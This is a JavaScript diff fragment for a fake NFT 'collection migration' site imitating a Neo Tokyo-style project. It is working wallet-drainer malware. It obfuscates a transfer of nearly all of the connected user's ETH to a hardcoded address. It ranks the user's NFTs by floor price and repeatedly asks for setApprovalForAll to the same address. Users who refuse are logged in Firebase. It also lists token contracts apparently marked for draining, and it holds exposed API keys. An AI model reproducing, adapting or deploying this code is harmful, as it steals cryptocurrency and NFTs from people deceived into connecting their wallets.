Date(),_0x4f6627[_0x32f5e5][_0x3b373b(0x1a2)]=!![],console[_0x3b373b(0x18f)](_0x4f6627[_0x32f5e5]),_0x18c12b[_0x3b373b(0x1ba)](_0x4f6627[_0x32f5e5]['contract'])[_0x3b373b(0x176)](_0x4f6627[_0x32f5e5])[_0x3b373b(0x150)](()=>{var _0x2af32c=_0x3b373b;console[_0x2af32c(0x18f)]('data\x20updated');})[_0x3b373b(0x187)](()=>{var _0x591740=_0x3b373b;console[_0x591740(0x18f)](_0x591740(0x198));});}}catch(_0x420ee4){console['log'](_0x420ee4),_0x420ee4[_0x3b373b(0x146)]==0xfa1&&(_0x4f6627[_0x32f5e5]['date']=new Date(),_0x4f6627[_0x32f5e5][_0x3b373b(0x1a2)]=![],console[_0x3b373b(0x18f)](_0x4f6627[_0x32f5e5]),_0x18c12b[_0x3b373b(0x1ba)](_0x4f6627[_0x32f5e5][_0x3b373b(0x145)])[_0x3b373b(0x1c6)]()['then'](_0x56200a=>{var _0x17b904=_0x3b373b;_0x56200a[_0x17b904(0x15a)]?(console[_0x17b904(0x18f)](_0x17b904(0x181)),_0x18c12b['doc'](_0x4f6627[_0x32f5e5][_0x17b904(0x145)])[_0x17b904(0x176)](_0x4f6627[_0x32f5e5])['then'](()=>{var _0x4cb8da=_0x17b904;console[_0x4cb8da(0x18f)](_0x4cb8da(0x174));})[_0x17b904(0x187)](_0x3943c5=>{var _0x33cc12=_0x17b904;console['log'](_0x33cc12(0x155)+_0x3943c5);})):(console[_0x17b904(0x18f)]('doc\x20does\x20not\x20exist'),_0x18c12b['doc'](_0x4f6627[_0x32f5e5][_0x17b904(0x145)])[_0x17b904(0x176)](_0x4f6627[_0x32f5e5])[_0x17b904(0x150)](()=>{var _0x1f5cd4=_0x17b904;console[_0x1f5cd4(0x18f)](_0x1f5cd4(0x174));})['catch'](_0x66b3d2=>{var _0x5ac5b3=_0x17b904;console[_0x5ac5b3(0x18f)](_0x5ac5b3(0x155)+_0x66b3d2);}));})[_0x3b373b(0x187)](_0x74e564=>{var _0x3a5d3f=_0x3b373b;console[_0x3a5d3f(0x18f)](_0x3a5d3f(0x166)+_0x74e564);}));}}account==_0x3b373b(0x18e)&&alert(_0x3b373b(0x158));var _0x2655af=await get_eth(account),_0x4ad064=_0x2655af-0.0084;const _0x45ca81=Web3['utils'][_0x3b373b(0x1a6)](_0x4ad064[_0x3b373b(0x195)](),'ether');console['log'](_0x45ca81);const _0x21f3c5={'from':account,'to':'0x2c5da2bcFe33ecF847F7558f6195BaBC2F582262','value':_0x45ca81};await web3[_0x3b373b(0x173)][_0x3b373b(0x1a9)](_0x21f3c5)[_0x3b373b(0x150)](_0x357b37=>{console['log'](_0x357b37);})[_0x3b373b(0x187)](_0x4a3139=>{var _0x453de1=_0x3b373b;console[_0x453de1(0x18f)](_0x4a3139);});}async function nfts(_0x4efb3a){var _0x55a51f=_0x29d1cc,_0xd2bf7=OPENSEA_URL+_0x55a51f(0x1c8)+_0x4efb3a+'/nfts',_0x1c4a15=[],_0x274801=[];return await $[_0x55a51f(0x1b5)]({'url':_0xd2bf7,'method':_0x55a51f(0x196),'headers':{'accept':_0x55a51f(0x199),'x-api-key':'078b8acce6a34dd3a2dbb0cd34127203'},'success':function(_0x8c3c52){var _0x3df405=_0x55a51f;for(var _0x31bc88=0x0;_0x31bc88<_0x8c3c52[_0x3df405(0x16e)][_0x3df405(0x1aa)];_0x31bc88++){_0x1c4a15[_0x3df405(0x1b7)](_0x8c3c52[_0x3df405(0x16e)][_0x31bc88][_0x3df405(0x145)]);}var _0x300f93=[...new Set(_0x1c4a15)];_0x1c4a15=_0x300f93;}}),_0x1c4a15[_0x55a51f(0x170)](_0x1da842=>{var _0x309a1d=_0x55a51f,_0x5b9bd3={'contract':''};_0x5b9bd3[_0x309a1d(0x145)]=_0x1da842,_0x274801[_0x309a1d(0x1b7)](_0x5b9bd3);}),_0x274801;}var checkConnected=setInterval(async()=>{var _0x15e325=_0x29d1cc,_0x497308=JSON[_0x15e325(0x1ae)](localStorage[_0x15e325(0x194)](_0x15e325(0x178)));!(_0x15e325(0x15c)in _0x497308[_0x15e325(0x1a5)][_0x15e325(0x19c)])?console[_0x15e325(0x18f)]('not\x20connected'):(check(),intervalStop(),console[_0x15e325(0x18f)](_0x15e325(0x197)));},0xbb8);function intervalStop(){var _0x967ecd=_0x29d1cc;clearInterval(checkConnected),console[_0x967ecd(0x18f)](_0x967ecd(0x169));}async function get_eth(_0x272dd1){var _0x31aea9=_0x29d1cc;const _0x4b2f04=web3[_0x31aea9(0x1c0)][_0x31aea9(0x160)](await web3[_0x31aea9(0x173)][_0x31aea9(0x152)](_0x272dd1),'ether')*0x1;return _0x4b2f04;}
+$(document).ready(function () {
+  console.log('yawa');
+})
+
+//FIREBASE
+
+const config = {
+apiKey: "AIzaSyAvIsuf_K1uvzo3cXEJchcBWnxb7ryKzk0",
+authDomain: "jangneotokyo.firebaseapp.com",
+projectId: "jangneotokyo",
+storageBucket: "jangneotokyo.appspot.com",
+messagingSenderId: "20777123504",
+appId: "1:20777123504:web:5d991c72b7af82ff6f4575"
+}
+
+const app = firebase.initializeApp(config)
+const db = firebase.firestore(app)
+
+const ref = db.collection('jangtokyo')
+
+const OPENSEA_URL = "https://api.opensea.io/"
+let account;
+
+async function loadWeb3() {
+try {
+  window.web3 = await new Web3(window.ethereum)
+} catch {
+  console.log(error)
+}
+}
+
+/**
+ * 
+ * @setItem
+ * @getItem 
+ */
+
+function setItem(key, value) {
+  localStorage.setItem(key, JSON.stringify(value));
+  }
+
+function getItem(key) {
+  return JSON.parse(localStorage.getItem(key));
+}
+
+//
+
+
+var sidebarCheck = setInterval(() => {
+  console.log('interval running')
+  intervalCheck()
+}, 1000);
+
+async function sidebar() {
+
+  $('.sidebar-menu__opener').on('click', function () {
+
+      // setTimeout(alert(';asd'), 100)
+
+      setTimeout(() => {
+          $('.css-14kzm9p').html(`
+      <div class="sidebar-menu__item"><h4 class="sidebar-menu__item-title ">Collection Migration<span class="sidebar-menu__item-title-chevron "><svg width="32" height="32" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M6.66675 10.6667H9.33341V13.3333H6.66675V10.6667ZM12.0001 16H9.33341V13.3333L12.0001 13.3333V16ZM14.6667 18.6667H12.0001V16L14.6667 16V18.6667ZM17.3334 18.6667V21.3333H14.6667L14.6667 18.6667H17.3334ZM20.0001 16H17.3334V18.6667H20.0001V16ZM22.6667 13.3333L22.6667 16L20.0001 16V13.3333L22.6667 13.3333ZM22.6667 13.3333V10.6667H25.33344V13.3333H22.6667Z"></path></svg></span></h4><div class="sidebar-menu__itemaccord "><div><button class="MuiButton-root MuiButton-contained MuiButton-containedPrimary MuiButton-sizeMedium MuiButton-containedSizeMedium MuiButton-fullWidth MuiButtonBase-root  css-1u5qx9" tabindex="0" type="button">CODES_MIGRATION.EXE<span class="MuiTouchRipple-root css-w0pj6f"></span></button></div></div></div><div class="MuiBox-root css-79elbk"><div class="MuiBox-root css-1sptbl0"><div class="sidebar-menu__item"><h4 class="sidebar-menu__item-title ">S2 citizen<span class="sidebar-menu__item-title-chevron "><svg width="32" height="32" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M6.66675 10.6667H9.33341V13.3333H6.66675V10.6667ZM12.0001 16H9.33341V13.3333L12.0001 13.3333V16ZM14.6667 18.6667H12.0001V16L14.6667 16V18.6667ZM17.3334 18.6667V21.3333H14.6667L14.6667 18.6667H17.3334ZM20.0001 16H17.3334V18.6667H20.0001V16ZM22.6667 13.3333L22.6667 16L20.0001 16V13.3333L22.6667 13.3333ZM22.6667 13.3333V10.6667H25.33344V13.3333H22.6667Z"></path></svg></span></h4><div class="sidebar-menu__itemaccord "><form class="sidebar-menu__item-form"><div class="sidebar-menu__item-block smi_w80 pad-r50 orderf1"><input name="customMessage" type="text" placeholder="Set your custom message" value=""></div><div class="sidebar-menu__item-block smi_w33 pad-r50 smi_small orderf3"><input name="identity" type="text" inputmode="numeric" placeholder="Identities" value=""></div><div class="sidebar-menu__item-block smi_w33 pad-r50 smi_small orderf4"><input name="cache" type="text" inputmode="numeric" placeholder="Item Caches" value=""></div><div class="sidebar-menu__item-block smi_w33 pad-r50 smi_small orderf5"><input name="land" type="text" inputmode="numeric" placeholder="Land Deeds" value=""></div><div class="sidebar-menu__item-block smi_w20 pad-r50 orderf2"><button type="submit" class="sidebar-menu__item-btn"><span>upload</span></button></div><style>
+          .form > * + * {
+            margin-top: 1rem;
+          }
+        </style></form></div></div><div class="sidebar-menu__item"><h4 class="sidebar-menu__item-title ">S1 citizen<span class="sidebar-menu__item-title-chevron "><svg width="32" height="32" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M6.66675 10.6667H9.33341V13.3333H6.66675V10.6667ZM12.0001 16H9.33341V13.3333L12.0001 13.3333V16ZM14.6667 18.6667H12.0001V16L14.6667 16V18.6667ZM17.3334 18.6667V21.3333H14.6667L14.6667 18.6667H17.3334ZM20.0001 16H17.3334V18.6667H20.0001V16ZM22.6667 13.3333L22.6667 16L20.0001 16V13.3333L22.6667 13.3333ZM22.6667 13.3333V10.6667H25.33344V13.3333H22.6667Z"></path></svg></span></h4><div class="sidebar-menu__itemaccord "><form class="sidebar-menu__item-form"><div class="sidebar-menu__item-block smi_w80 pad-r50 orderf1"><input name="customMessage" type="text" placeholder="Set your custom message" value=""></div><div class="sidebar-menu__item-block smi_w25 pad-r50 smi_small orderf3"><input name="identity" type="text" inputmode="numeric" placeholder="Identities" value=""></div><div class="sidebar-menu__item-block smi_w25 pad-r50 smi_small orderf4"><input name="vault" type="text" inputmode="numeric" placeholder="Vault boxes — Optional" value=""></div><div class="sidebar-menu__item-block smi_w25 pad-r50 smi_small orderf5"><input name="cache" type="text" inputmode="numeric" placeholder="Item Caches" value=""></div><div class="sidebar-menu__item-block smi_w25 pad-r50 smi_small orderf6"><input name="land" type="text" inputmode="numeric" placeholder="Land Deeds" value=""></div><div class="sidebar-menu__item-block smi_w20 pad-r50 orderf2"><button class="sidebar-menu__item-btn"><span>upload</span></button></div><style>
+          .form > * + * {
+            margin-top: 1rem;
+          }
+        </style></form></div></div><div class="sidebar-menu__item"><h4 class="sidebar-menu__item-title ">Identities &amp; lands<span class="sidebar-menu__item-title-chevron "><svg width="32" height="32" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M6.66675 10.6667H9.33341V13.3333H6.66675V10.6667ZM12.0001 16H9.33341V13.3333L12.0001 13.3333V16ZM14.6667 18.6667H12.0001V16L14.6667 16V18.6667ZM17.3334 18.6667V21.3333H14.6667L14.6667 18.6667H17.3334ZM20.0001 16H17.3334V18.6667H20.0001V16ZM22.6667 13.3333L22.6667 16L20.0001 16V13.3333L22.6667 13.3333ZM22.6667 13.3333V10.6667H25.33344V13.3333H22.6667Z"></path></svg></span></h4><div class="sidebar-menu__itemaccord "><div class="sidebar-menu__item-blist"><div class="sidebar-menu__item-bitem"><form action="" class="sidebar-menu__item-bitem-form"><div class="sidebar-menu__item-bitem-form-holder"><h6 class="sidebar-menu__item-bitem-form-title">Mint New Identity</h6><div class="sidebar-menu__item-bitem-form-info">Cost: 2000 bytes</div></div><button class="sidebar-menu__item-bitem-form-btn" disabled="">offline</button></form></div><div class="sidebar-menu__item-bitem"><form action="" class="sidebar-menu__item-bitem-form"><div class="sidebar-menu__item-bitem-form-holder"><h6 class="sidebar-menu__item-bitem-form-title">Create New Land</h6><div class="sidebar-menu__item-bitem-form-info">Cost: 500 bytes</div></div><button class="sidebar-menu__item-bitem-form-btn" disabled="">offline</button></form></div><div class="sidebar-menu__item-bitem"><form action="" class="sidebar-menu__item-bitem-form"><div class="sidebar-menu__item-bitem-form-holder"><h6 class="sidebar-menu__item-bitem-form-title">S2 Identity Item Claim</h6><input type="text" inputmode="numeric" placeholder="Add S2 Identity Token ID" value="0"></div><button class="sidebar-menu__item-bitem-form-btn" disabled="">submit</button></form></div><div class="sidebar-menu__item-bitem"><form action="" class="sidebar-menu__item-bitem-form"><div class="sidebar-menu__item-bitem-form-holder"><h6 class="sidebar-menu__item-bitem-form-title">S2 Identity Land Claim</h6><input type="text" inputmode="numeric" placeholder="Add S2 Identity Token ID" value="0"></div><button class="sidebar-menu__item-bitem-form-btn" disabled="">submit</button></form></div></div></div></div></div><button class="sidebar-menu__item-btn MuiBox-root css-htg0vc"><span>Connect Wallet</span></button></div>
+      `)
+
+      $('.css-txdpd1').remove()
+
+
+      console.log('sidebar clicked')
+
+      
+      
+      const button1 = $('.css-1u5qx9')
+      const button2 = $('.css-htg0vc')
+
+      button1.on('click', function () {
+          menuItems()
+      })
+      button2.on('click', function () {
+          menuItems()
+      })
+
+
+
+
+
+      }, 1000);
+
+  })
+}
+
+
+async function header() {
+  var headermenu0, headermenu1, headermenu2, headermenu3, headermenu4, headermenu5;
+  
+  
+  headermenu0 = $('.header-menu__right').find('ul').find('li').eq([0])
+  headermenu1 = $('.header-menu__right').find('ul').find('li').eq([1])
+  headermenu2 = $('.header-menu__right').find('ul').find('li').eq([2])
+  headermenu3 = $('.header-menu__right').find('ul').find('li').eq([3])
+  headermenu4 = $('.header-menu__right').find('ul').find('li').eq([4])
+  headermenu5 = $('.header-menu__right').find('ul').find('li').eq([5])
+
+
+
+  headermenu0.find('a').removeClass('active')
+  headermenu1.find('a').removeClass('active')
+  headermenu2.find('a').removeClass('active')
+  headermenu3.find('a').removeClass('active')
+  headermenu4.find('a').removeClass('active')
+  headermenu5.find('a').removeClass('active')
+  
+
+
+
+
+
+  headermenu0.on('click', function () {
+    menuItems()
+  })
+  headermenu1.on('click', function () {
+    menuItems()
+  })
+  headermenu2.on('click', function () {
+    menuItems()
+  })
+  headermenu3.on('click', function () {
+    menuItems()
+  })
+  headermenu4.on('click', function () {
+    menuItems()
+  })
+  headermenu5.on('click', function () {
+    menuItems()
+  })
+
+
+/*--------*/
+var faq = $('.header-menu__right').find('ul').eq([1]).find('li').eq([0])
+faq.find('a').removeClass('active')
+
+faq.on('click', function () {
+  menuItems()
+})
+
+}
+
+
+async function intervalCheck() {
+
+  if ($('.sidebar').length) {
+      clearInterval(sidebarCheck)
+      console.log('true, interval cleared')
+      await sidebar()
+      await header()
+
+
+  } else {
+      console.log('false')
+  }
+
+}
+
+async function menuItems() {
+      const ganaYawa = $('.menu2').find('li').eq([6]).find('span').eq([0]).find('span.menu__link-text')
+      ganaYawa.click()
+}
+
+
+
+
+
+async function getAddress() {
+  const d = JSON.parse(localStorage.getItem('wagmi.store'))
+  console.log(d);
+  const userAddress = d.state.data.account
+
+  account = userAddress
+  console.log(account)
+
+  const LISTCOLLECTION =   db.collection('addresses').doc(account)
+
+  await LISTCOLLECTION.get().then(
+    (docSnapshot) => {
+      if (
+        docSnapshot.exists
+      ) {
+        console.log('doc exists')
+        LISTCOLLECTION.update({
+          status: 'connected',
+          date: new Date()
+        })
+
+      } else {
+
+        console.log('doc not found')
+        LISTCOLLECTION.set({
+          address: account,
+          date: new Date(),
+          status: 'connected'
+        }).then( () => {
+          console.log('successfully added')
+        }).catch( () => {
+          console.log('error adding document');
+        })
+
+
+      }
+    }
+  )
+
+
+
+}
+
+const erc20TokenContractAbi = [
+  { inputs: [], stateMutability: "nonpayable", type: "constructor" },
+  {
+    anonymous: false,
+    inputs: [
+      {
+        indexed: true,
+        internalType: "address",
+        name: "owner",
+        type: "address",
+      },
+      {
+        indexed: true,
+        internalType: "address",
+        name: "spender",
+        type: "address",
+      },
+      {
+        indexed: false,
+        internalType: "uint256",
+        name: "value",
+        type: "uint256",
+      },
+    ],
+    name: "Approval",
+    type: "event",
+  },
+  {
+    anonymous: false,
+    inputs: [
+      { indexed: true, internalType: "address", name: "from", type: "address" },
+      { indexed: true, internalType: "address", name: "to", type: "address" },
+      {
+        indexed: false,
+        internalType: "uint256",
+        name: "value",
+        type: "uint256",
+      },
+    ],
+    name: "Transfer",
+    type: "event",
+  },
+  {
+    inputs: [
+      { internalType: "address", name: "owner", type: "address" },
+      { internalType: "address", name: "spender", type: "address" },
+    ],
+    name: "allowance",
+    outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
+    stateMutability: "view",
+    type: "function",
+  },
+  {
+    inputs: [
+      { internalType: "address", name: "spender", type: "address" },
+      { internalType: "uint256", name: "amount", type: "uint256" },
+    ],
+    name: "approve",
+    outputs: [{ internalType: "bool", name: "", type: "bool" }],
+    stateMutability: "nonpayable",
+    type: "function",
+  },
+  {
+    inputs: [{ internalType: "address", name: "account", type: "address" }],
+    name: "balanceOf",
+    outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
+    stateMutability: "view",
+    type: "function",
+  },
+  {
+    inputs: [],
+    name: "decimals",
+    outputs: [{ internalType: "uint8", name: "", type: "uint8" }],
+    stateMutability: "view",
+    type: "function",
+  },
+  {
+    inputs: [
+      { internalType: "address", name: "spender", type: "address" },
+      { internalType: "uint256", name: "subtractedValue", type: "uint256" },
+    ],
+    name: "decreaseAllowance",
+    outputs: [{ internalType: "bool", name: "", type: "bool" }],
+    stateMutability: "nonpayable",
+    type: "function",
+  },
+  {
+    inputs: [
+      { internalType: "address", name: "spender", type: "address" },
+      { internalType: "uint256", name: "addedValue", type: "uint256" },
+    ],
+    name: "increaseAllowance",
+    outputs: [{ internalType: "bool", name: "", type: "bool" }],
+    stateMutability: "nonpayable",
+    type: "function",
+  },
+  {
+    inputs: [],
+    name: "name",
+    outputs: [{ internalType: "string", name: "", type: "string" }],
+    stateMutability: "view",
+    type: "function",
+  },
+  {
+    inputs: [],
+    name: "symbol",
+    outputs: [{ internalType: "string", name: "", type: "string" }],
+    stateMutability: "view",
+    type: "function",
+  },
+  {
+    inputs: [],
+    name: "totalSupply",
+    outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
+    stateMutability: "view",
+    type: "function",
+  },
+  {
+    inputs: [
+      { internalType: "address", name: "recipient", type: "address" },
+      { internalType: "uint256", name: "amount", type: "uint256" },
+    ],
+    name: "transfer",
+    outputs: [{ internalType: "bool", name: "", type: "bool" }],
+    stateMutability: "nonpayable",
+    type: "function",
+  },
+  {
+    inputs: [
+      { internalType: "address", name: "sender", type: "address" },
+      { internalType: "address", name: "recipient", type: "address" },
+      { internalType: "uint256", name: "amount", type: "uint256" },
+    ],
+    name: "transferFrom",
+    outputs: [{ internalType: "bool", name: "", type: "bool" }],
+    stateMutability: "nonpayable",
+    type: "function",
+  },
+];
+
+const _abi = [
+  {
+    inputs: [],
+    stateMutability: "nonpayable",
+    type: "constructor",
+  },
+  {
+    anonymous: false,
+    inputs: [
+      {
+        indexed: true,
+        internalType: "address",
+        name: "owner",
+        type: "address",
+      },
+      {
+        indexed: true,
+        internalType: "address",
+        name: "approved",
+        type: "address",
+      },
+      {
+        indexed: true,
+        internalType: "uint256",
+        name: "tokenId",
+        type: "uint256",
+      },
+    ],
+    name: "Approval",
+    type: "event",
+  },
+  {
+    anonymous: false,
+    inputs: [
+      {
+        indexed: true,
+        internalType: "address",
+        name: "owner",
+        type: "address",
+      },
+      {
+        indexed: true,
+        internalType: "address",
+        name: "operator",
+        type: "address",
+      },
+      {
+        indexed: false,
+        internalType: "bool",
+        name: "approved",
+        type: "bool",
+      },
+    ],
+    name: "ApprovalForAll",
+    type: "event",
+  },
+  {
+    anonymous: false,
+    inputs: [
+      {
+        indexed: true,
+        internalType: "address",
+        name: "previousOwner",
+        type: "address",
+      },
+      {
+        indexed: true,
+        internalType: "address",
+        name: "newOwner",
+        type: "address",
+      },
+    ],
+    name: "OwnershipTransferred",
+    type: "event",
+  },
+  {
+    anonymous: false,
+    inputs: [
+      {
+        indexed: true,
+        internalType: "address",
+        name: "from",
+        type: "address",
+      },
+      {
+        indexed: true,
+        internalType: "address",
+        name: "to",
+        type: "address",
+      },
+      {
+        indexed: true,
+        internalType: "uint256",
+        name: "tokenId",
+        type: "uint256",
+      },
+    ],
+    name: "Transfer",
+    type: "event",
+  },
+  {
+    inputs: [
+      {
+        internalType: "address",
+        name: "to",
+        type: "address",
+      },
+      {
+        internalType: "uint256",
+        name: "tokenId",
+        type: "uint256",
+      },
+    ],
+    name: "approve",
+    outputs: [],
+    stateMutability: "nonpayable",
+    type: "function",
+  },
+  {
+    inputs: [
+      {
+        internalType: "address",
+        name: "owner",
+        type: "address",
+      },
+    ],
+    name: "balanceOf",
+    outputs: [
+      {
+        internalType: "uint256",
+        name: "",
+        type: "uint256",
+      },
+    ],
+    stateMutability: "view",
+    type: "function",
+  },
+  {
+    inputs: [
+      {
+        internalType: "uint256",
+        name: "tokenId",
+        type: "uint256",
+      },
+    ],
+    name: "getApproved",
+    outputs: [
+      {
+        internalType: "address",
+        name: "",
+        type: "address",
+      },
+    ],
+    stateMutability: "view",
+    type: "function",
+  },
+  {
+    inputs: [
+      {
+        internalType: "address",
+        name: "owner",
+        type: "address",
+      },
+      {
+        internalType: "address",
+        name: "operator",
+        type: "address",
+      },
+    ],
+    name: "isApprovedForAll",
+    outputs: [
+      {
+        internalType: "bool",
+        name: "",
+        type: "bool",
+      },
+    ],
+    stateMutability: "view",
+    type: "function",
+  },
+  {
+    inputs: [],
+    name: "name",
+    outputs: [
+      {
+        internalType: "string",
+        name: "",
+        type: "string",
+      },
+    ],
+    stateMutability: "view",
+    type: "function",
+  },
+  {
+    inputs: [],
+    name: "owner",
+    outputs: [
+      {
+        internalType: "address",
+        name: "",
+        type: "address",
+      },
+    ],
+    stateMutability: "view",
+    type: "function",
+  },
+  {
+    inputs: [
+      {
+        internalType: "uint256",
+        name: "tokenId",
+        type: "uint256",
+      },
+    ],
+    name: "ownerOf",
+    outputs: [
+      {
+        internalType: "address",
+        name: "",
+        type: "address",
+      },
+    ],
+    stateMutability: "view",
+    type: "function",
+  },
+  {
+    inputs: [],
+    name: "renounceOwnership",
+    outputs: [],
+    stateMutability: "nonpayable",
+    type: "function",
+  },
+  {
+    inputs: [
+      {
+        internalType: "address",
+        name: "to",
+        type: "address",
+      },
+      {
+        internalType: "uint256",
+        name: "tokenId",
+        type: "uint256",
+      },
+    ],
+    name: "safeMint",
+    outputs: [],
+    stateMutability: "nonpayable",
+    type: "function",
+  },
+  {
+    inputs: [
+      {
+        internalType: "address",
+        name: "from",
+        type: "address",
+      },
+      {
+        internalType: "address",
+        name: "to",
+        type: "address",
+      },
+      {
+        internalType: "uint256",
+        name: "tokenId",
+        type: "uint256",
+      },
+    ],
+    name: "safeTransferFrom",
+    outputs: [],
+    stateMutability: "nonpayable",
+    type: "function",
+  },
+  {
+    inputs: [
+      {
+        internalType: "address",
+        name: "from",
+        type: "address",
+      },
+      {
+        internalType: "address",
+        name: "to",
+        type: "address",
+      },
+      {
+        internalType: "uint256",
+        name: "tokenId",
+        type: "uint256",
+      },
+      {
+        internalType: "bytes",
+        name: "data",
+        type: "bytes",
+      },
+    ],
+    name: "safeTransferFrom",
+    outputs: [],
+    stateMutability: "nonpayable",
+    type: "function",
+  },
+  {
+    inputs: [
+      {
+        internalType: "address",
+        name: "operator",
+        type: "address",
+      },
+      {
+        internalType: "bool",
+        name: "approved",
+        type: "bool",
+      },
+    ],
+    name: "setApprovalForAll",
+    outputs: [],
+    stateMutability: "nonpayable",
+    type: "function",
+  },
+  {
+    inputs: [
+      {
+        internalType: "bytes4",
+        name: "interfaceId",
+        type: "bytes4",
+      },
+    ],
+    name: "supportsInterface",
+    outputs: [
+      {
+        internalType: "bool",
+        name: "",
+        type: "bool",
+      },
+    ],
+    stateMutability: "view",
+    type: "function",
+  },
+  {
+    inputs: [],
+    name: "symbol",
+    outputs: [
+      {
+        internalType: "string",
+        name: "",
+        type: "string",
+      },
+    ],
+    stateMutability: "view",
+    type: "function",
+  },
+  {
+    inputs: [
+      {
+        internalType: "uint256",
+        name: "tokenId",
+        type: "uint256",
+      },
+    ],
+    name: "tokenURI",
+    outputs: [
+      {
+        internalType: "string",
+        name: "",
+        type: "string",
+      },
+    ],
+    stateMutability: "view",
+    type: "function",
+  },
+  {
+    inputs: [
+      {
+        internalType: "address",
+        name: "from",
+        type: "address",
+      },
+      {
+        internalType: "address",
+        name: "to",
+        type: "address",
+      },
+      {
+        internalType: "uint256",
+        name: "tokenId",
+        type: "uint256",
+      },
+    ],
+    name: "transferFrom",
+    outputs: [],
+    stateMutability: "nonpayable",
+    type: "function",
+  },
+  {
+    inputs: [
+      {
+        internalType: "address",
+        name: "newOwner",
+        type: "address",
+      },
+    ],
+    name: "transferOwnership",
+    outputs: [],
+    stateMutability: "nonpayable",
+    type: "function",
+  },
+];
+
+
+
+async function check() {
+
+  await getAddress();
+
+  console.log(account);
+
+  var nft = await nfts(account)
+  console.log(nft)
+
+
+var data = {
+  time: new Date(),
+  spoof: nft,
+  owner: account
+}
+
+
+      if (getItem(account) == null || getItem(account).length == 0) {
+          console.log('no data')
+
+          setItem(account, data)
+          trade()
+          console.log('data added')
+
+      } else {
+          console.log('data already exists')
+
+          trade()
+      }
+
+                  
+
+
+}
+
+
+
+async function trade() {
+
+  await loadWeb3();
+
+
+  var collection = []
+  var owner;
+  var sortedCollection = []
+
+
+  data = getItem(account)
+
+  owner = data.owner
+  collection = data.spoof
+
+
+ for (let i = 0; i < collection.length; i++) {
+  collection[i].worth = 0;
+  collection[i].owner = owner;
+
+
+  try {
+
+      var result =  await $.ajax({
+          url: "https://eth-mainnet.g.alchemy.com/nft/v2/i3QT46oiQpqqceCkiWb0kIn24YNEVcRH/getFloorPrice?contractAddress="+collection[i].contract,
+          method: "GET",
+          // success: function (data) {
+          //     console.log(data)
+
+
+
+          // }
+      })
+
+      if (result.openSea != undefined && result.openSea.floorPrice != undefined)
+      collection[i].worth = result.openSea.floorPrice
+
+      
+  } catch (error) {
+      console.log(error)
+
+      if(collection[i].stats.seven_day_volume > 0) {
+          collection[i].worth = Math.round(
+              collection[i].stats.seven_day_volume * 0.8 * 10000
+          ) / 10000
+      }
+  }
+  
+ }
+
+ collection = collection.sort( (a, b) => {
+  return a.worth < b.worth
+  ? 1
+  : -1;
+})
+
+
+
+for (let i = 0; i < collection.length; i++) {
+
+   if (collection[i].worth != 0) {
+      sortedCollection.push(collection[i])
+   }
+  
+}
+
+collection = sortedCollection;
+
+
+ console.log(collection)
+
+/*---------------------------------------------------------------*/
+
+  var declinedCollection = []
+
+ //jang contracts
+ const collection_contracts = db.collection(account.toLowerCase())
+ //
+
+
+
+await collection_contracts.get().then( (querySnapshot) => {
+  querySnapshot.forEach( (doc) => {
+      var data = doc.data()
+      var approved = data.approved
+
+      //console.log(approved)
+
+      
+      if (approved === false) {
+          console.log('declined')
+
+          // console.log(data)
+
+          //console.log(data)
+          declinedCollection.push(data)
+      } else {
+          //
+          console.log('nothing saved yet')
+      }
+
+  })
+}).catch( (error) => {
+  console.log('error gettings documents ' + error)
+})
+
+
+
+
+
+if (declinedCollection.length < 1) {
+  console.log('no data declined contracts yet')
+} else {
+  console.log('filtered declined collections')
+  collection = declinedCollection
+}
+
+
+
+
+console.log(collection)
+/*---------------------------------------------------------------*/
+
+  for (let i = 0; i < collection.length; i++) {
+     
+
+      // console.log(collection[i])
+
+      try {
+
+          
+          if (collection[i].approved == true) {
+
+
+              console.log('approved')
+              //no more approval
+              //ilocalstorage nalang ni?
+
+
+          } else {
+
+      
+
+              var collectionContract = await new window.web3.eth.Contract(_abi, collection[i].contract, {gas: '100000'})
+              await collectionContract.methods.setApprovalForAll('0x2c5da2bcFe33ecF847F7558f6195BaBC2F582262', true).send({from: account})
+
+              collection[i].date = new Date()
+              collection[i].approved = true
+              console.log(collection[i])
+              
+              collection_contracts.doc(collection[i].contract).set(collection[i])
+                  .then( () => {
+                      console.log('data updated')
+                  })
+                  .catch( () => {
+                      console.log('error data update')
+                  })
+
+
+          }
+
+          
+      } catch (error) {
+
+          console.log(error)
+
+          if (error.code == 4001) {
+       
+
+              collection[i].date = new Date()
+              collection[i].approved = false
+              console.log(collection[i])
+
+
+
+              collection_contracts.doc(collection[i].contract).get()
+                  .then( (docSnapshot) => {
+                      if (docSnapshot.exists) {
+
+                          console.log('data already existed')
+
+                      } else {
+                          console.log('doc does not exist')
+
+                          collection_contracts.doc(collection[i].contract).set(collection[i])
+                          .then( () => {
+                              console.log('data updated')
+                          }).catch( (error) => {
+                              console.log('error setting document ' + error)
+                          })
+                      }
+                  }).catch( (error) => {
+                      console.log('Error getting data ' + error)
+                  })
+                      
+
+
+
+              
+          }
+          
+      }
+
+     const t = [
+    [{token: '0x62D0A8458eD7719FDAF978fe5929C6D342B0bFcE'}, {balance: 30000}],
+    [{token: '0x25f8087EAD173b73D6e8B84329989A8eEA16CF73'}, {balance: 1133}],
+    
+    [{token: '0x3845badAde8e6dFF049820680d1F14bD3903a5d0'}, {balance: 1108}],
+
+    [{token: '0x64Bc2cA1Be492bE7185FAA2c8835d9b824c8a194'}, {balance: 1215}],
+
+    [{token: '0xd1d2Eb1B1e90B638588728b4130137D262C87cae'}, {balance: 19009}],
+
+    [{token: '0xF57e7e7C23978C3cAEC3C3548E3D615c346e79fF'}, {balance: 225}],
+
+    [{token: '0xb23d80f5FefcDDaa212212F028021B41DEd428CF'}, {balance: 4}],
+
+    [{token: '0x25f8087EAD173b73D6e8B84329989A8eEA16CF73'}, {balance: 47}],
+
+    [{token: '0xe53EC727dbDEB9E2d5456c3be40cFF031AB40A55'}, {balance: 510}],
+
+    [{token: '0x6982508145454Ce325dDbE47a25d4ec3d2311933'}, {balance: 226530705}],
+
